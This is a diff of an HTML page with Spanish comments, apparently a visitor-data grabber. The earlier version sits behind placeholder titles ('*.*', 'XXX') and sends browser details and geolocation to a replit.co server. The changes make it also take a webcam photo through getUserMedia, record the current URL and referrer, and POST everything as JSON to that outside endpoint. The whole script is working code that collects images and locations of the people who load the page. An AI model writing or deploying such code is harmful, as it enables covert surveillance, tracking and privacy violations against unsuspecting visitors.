@@ -3,62 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>*.*</title>
+    <title>Captura de Datos</title>
     <script>
-        function capturarDatos() {
-            // Capturar datos básicos
-            const datos = {
-                userAgent: navigator.userAgent,
-                plataforma: navigator.platform,
-                idioma: navigator.language,
-                online: navigator.onLine,
-                horaAcceso: new Date().toISOString() // Hora en formato ISO
+        async function capturarDatos() {
+            // Capturar foto
+            const video = document.createElement('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const foto = canvas.toDataURL('image/jpeg');
+
+            // Detener el stream
+            stream.getTracks().forEach(track => track.stop());
+
+            // Capturar ubicación
+            const ubicacion = await new Promise(resolve => {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        resolve({
+                            latitud: position.coords.latitude,
+                            longitud: position.coords.longitude
+                        });
+                    },
+                    () => resolve({ latitud: 'No disponible', longitud: 'No disponible' })
+                );
+            });
+
+            // Capturar historial de navegación
+            const historial = {
+                urlActual: window.location.href,
+                referrer: document.referrer
             };
 
-            // Capturar ubicación usando Geolocation API
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        datos.ubicacion = {
-                            latitud: position.coords.latitude,
-                            longitud: position.coords.longitude,
-                            precision: position.coords.accuracy
-                        };
-
-                        enviarDatos(datos); // Enviar datos al servidor con ubicación
-                    },
-                    (error) => {
-                        console.error("Error al obtener la ubicación:", error);
-                        datos.ubicacion = { error: "No se pudo obtener la ubicación" };
-                        enviarDatos(datos); // Enviar datos al servidor sin ubicación
-                    }
-                );
-            } else {
-                datos.ubicacion = { error: "Geolocalización no soportada" };
-                enviarDatos(datos); // Enviar datos al servidor sin ubicación
-            }
-        }
-
-        function enviarDatos(datos) {
+            // Enviar datos al servidor
+            const datos = { foto, ubicacion, historial };
             fetch('https://979c5a95-3dfb-4130-8e4b-c2a06b13a186-00-cuily0isatzs.spock.repl.co/capturar-datos', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(datos)
             })
-            .then(response => {
-                if (response.ok) {
-                    return response.json();
-                } else {
-                    throw new Error("Error en la respuesta del servidor.");
-                }
-            })
+            .then(response => response.json())
             .then(data => {
-                console.log("Datos enviados:", data);
-                document.getElementById("mensaje").textContent = " ";
+                console.log("Datos enviados correctamente:", data);
+                document.getElementById("mensaje").textContent = "Datos enviados correctamente.";
             })
             .catch(error => {
                 console.error("Error al enviar los datos:", error);
-                document.getElementById("mensaje").textContent = "-.-.";
+                document.getElementById("mensaje").textContent = "Error al enviar los datos.";
             });
         }
 
@@ -66,8 +63,8 @@
     </script>
 </head>
 <body>
-    <h1>XXX</h1>
-    <p> </p>
-    <p id="mensaje">...</p>
+    <h1>Captura de Datos</h1>
+    <p id="mensaje">Enviando datos...</p>
 </body>
 </html>
+
